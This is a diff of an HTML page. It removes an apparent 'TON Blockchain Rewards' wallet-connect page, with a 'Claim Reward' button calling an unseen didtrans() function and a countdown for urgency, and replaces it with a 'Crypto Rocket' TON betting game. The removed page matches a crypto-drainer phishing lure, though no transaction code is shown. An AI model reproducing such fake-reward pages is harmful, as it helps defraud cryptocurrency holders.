@@ -3,219 +3,93 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>TON Blockchain Rewards</title>
-    
+    <title>Crypto Rocket</title>
     <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
     <script src="https://unpkg.com/@tonconnect/sdk@latest/dist/tonconnect-sdk.min.js"></script>
-    
     <style>
-        /* Общие настройки */
         body {
-            background: linear-gradient(135deg, #001f3d, #0057b7);
+            background-color: #001f3d;
             color: white;
             font-family: Arial, sans-serif;
-            text-align: center;
             display: flex;
             flex-direction: column;
             align-items: center;
-            justify-content: space-evenly; /* Убираем перекрытие элементов */
-            height: 100vh; /* Устанавливаем высоту экрана */
+            justify-content: center;
+            height: 100vh;
             margin: 0;
-            padding: 10px;
-            box-sizing: border-box;
-            overflow: hidden; /* Отключаем прокрутку по высоте */
         }
-
-        /* Настройки заголовка */
-        #title {
-            font-size: 8vw; /* Делаем размер шрифта гибким */
-            font-weight: bold;
-            color: #00aaff;
-            text-shadow: 0 0 10px #00aaff;
-            margin-bottom: 5px;
-        }
-
-        /* Логотип */
-        #ton-logo-large {
-            width: 18vw; /* Делаем логотип гибким */
-            height: auto;
-            margin-bottom: 10px;
-        }
-
-        /* Подзаголовок */
-        #subtitle {
-            font-size: 5vw; /* Размер шрифта зависит от ширины экрана */
-            color: #b0c4de;
-            margin-bottom: 15px;
-        }
-
-        /* Основной контейнер */
-        main {
-            display: flex;
-            flex-direction: column;
-            align-items: center;
-            justify-content: center;
-            gap: 10px;
-            flex-grow: 1;
-            overflow-y: auto; /* Добавляем прокрутку для основного контента */
-        }
-
-        /* Кнопка */
-        button {
-            background: linear-gradient(90deg, #0088cc, #00aaff);
-            color: white;
-            font-size: 5vw; /* Размер шрифта для кнопки */
-            padding: 3vw 6vw;
-            border: none;
-            border-radius: 8px;
-            cursor: pointer;
-            transition: 0.3s;
-            box-shadow: 0 0 10px #00aaff;
-            margin-bottom: 10px;
-        }
-
-        button:hover {
-            background: linear-gradient(90deg, #0066aa, #0099dd);
-            box-shadow: 0 0 20px #00aaff;
-        }
-
-        /* Логотипы внизу */
-        #logos {
-            display: flex;
-            gap: 5vw;
-            justify-content: center;
-            margin-top: 10px;
-        }
-
-        .logo {
-            width: 12vw; /* Сделаем логотипы более адаптивными */
-            height: auto;
-        }
-
-        /* Динамичные лого с анимацией */
-        .dynamic-logo {
-            width: 15vw; /* Размер динамичных логотипов */
-            height: auto;
-            transition: transform 1s ease-in-out;
-            animation: heartbeat 1.5s ease-in-out infinite;
-        }
-
-        @keyframes heartbeat {
-            0%, 100% {
-                transform: scale(1);
-            }
-            25% {
-                transform: scale(1.2);
-            }
-            50% {
-                transform: scale(1);
-            }
-            75% {
-                transform: scale(1.2);
-            }
-        }
-
-        /* Таймер */
-        #countdown {
-            font-size: 6vw; /* Размер шрифта таймера */
-            font-weight: bold;
-            color: #ff4444;
-            margin-top: 10px;
-        }
-
-        /* Блок с информацией о кошельке */
-        #wallet-info {
-            font-size: 4.5vw;
+        #ton-connect {
             margin-bottom: 20px;
         }
-
-        /* Мобильный дизайн: запрет на прокрутку */
-        @media (max-width: 768px) {
-            main {
-                gap: 10px;
-                height: 100%; /* Устанавливаем контейнер на всю высоту */
-                overflow-y: auto; /* Если нужно, добавляем прокрутку по содержимому */
-            }
-
-            #subtitle {
-                font-size: 5vw;
-            }
-
-            button {
-                font-size: 5vw;
-                padding: 4vw 8vw;
-            }
-
-            #countdown {
-                font-size: 5vw;
-            }
-
-            #logos {
-                gap: 5vw;
-            }
-
-            .logo {
-                width: 12vw;
-            }
+        button {
+            background-color: #0073e6;
+            color: white;
+            font-size: 24px;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            transition: background-color 0.3s;
+        }
+        button:hover {
+            background-color: #005bb5;
+        }
+        .claim-button, .play-button {
+            margin-top: 20px;
+        }
+        #wallet-info, #game-info {
+            margin-top: 20px;
+            font-size: 18px;
+            font-weight: bold;
+        }
+        /* Поле ввода */
+        input {
+            font-size: 18px;
+            padding: 5px;
+            width: 100px;
+            margin: 10px 0;
+            text-align: center;
+        }
+        /* Игровая зона */
+        .game-container {
+            width: 300px;
+            height: 300px;
+            position: relative;
+            overflow: hidden;
+            background-color: black;
+            border-radius: 10px;
+            margin-top: 20px;
+        }
+        .rocket {
+            width: 50px;
+            height: 50px;
+            position: absolute;
+            bottom: 10px;
+            left: 50%;
+            transform: translateX(-50%);
+            transition: bottom 0.1s linear;
         }
     </style>
 </head>
 <body>
-    <div id="title">TON Blockchain Rewards</div>
-    <img id="ton-logo-large" src="ton_logo.png" alt="TON Logo">
 
-    <main>
-        <div id="subtitle">Connect your wallet and claim your reward now!</div>
+    <div id="greeting">Crypto Rocket</div>
 
-        <div id="wallet-info"></div> <!-- Блок для отображения баланса -->
+    <div id="ton-connect"></div>
 
-        <div id="dynamic-logos">
-            <img class="dynamic-logo" src="notcoin_logo.png" alt="Notcoin">
-            <img class="dynamic-logo" src="ton_logo.png" alt="TON">
-            <img class="dynamic-logo" src="dog_logo.png" alt="TonDogs">
-        </div>
+    <input type="number" id="betAmount" placeholder="Ставка (TON)" min="1" />
 
-        <div id="ton-connect"></div>
-        <button onclick="didtrans();">🚀 Claim Reward 🚀</button>
-        
-        <div id="countdown"></div> <!-- Просто сам таймер -->
+    <button onclick="startGame();" class="play-button">Играть</button>
 
-        <div id="logos">
-            <img class="logo" src="telegram_logo.png" alt="Telegram">
-            <img class="logo" src="ton_logo.png" alt="TON Blockchain">
-            <img class="logo" src="blockchain_logo.png" alt="Blockchain">
-        </div>
-    </main>
-    <footer>
-        © 2025 TON Blockchain Rewards | All rights reserved
-    </footer>
-    <!-- Heartbeat Sound -->
-    <audio id="heartbeat-sound" src="heartbeat_sound.mp3" loop></audio>
+    <div id="game-info">Коэффициент: <span id="multiplier">1.00</span>x</div>
+
+    <div class="game-container">
+        <img src="logo1.png" class="rocket" id="rocket">
+    </div>
+
+    <button onclick="stopGame();" class="claim-button">Стоп</button>
 
     <script src="tonsdk.js"></script>
-    
-    <script>
-        // Функция для обновления таймера
-        function startCountdown() {
-            let timerElement = document.getElementById('countdown');
-            let timeRemaining = 180; // 180 секунд (3 минуты)
 
-            // Функция для обновления времени каждую секунду
-            const countdownInterval = setInterval(function() {
-                if (timeRemaining <= 0) {
-                    clearInterval(countdownInterval); // Останавливаем таймер, когда время истечет
-                    timerElement.innerText = '0'; // Когда время закончится, ставим 0
-                } else {
-                    timerElement.innerText = timeRemaining; // Просто выводим время
-                    timeRemaining--;
-                }
-            }, 1000); // Обновляем каждую секунду
-        }
-
-        // Запуск таймера при загрузке страницы
-        window.onload = function() {
-            startCountdown();
-        };
-    </script>
-</body>  
+</body>
 </html>
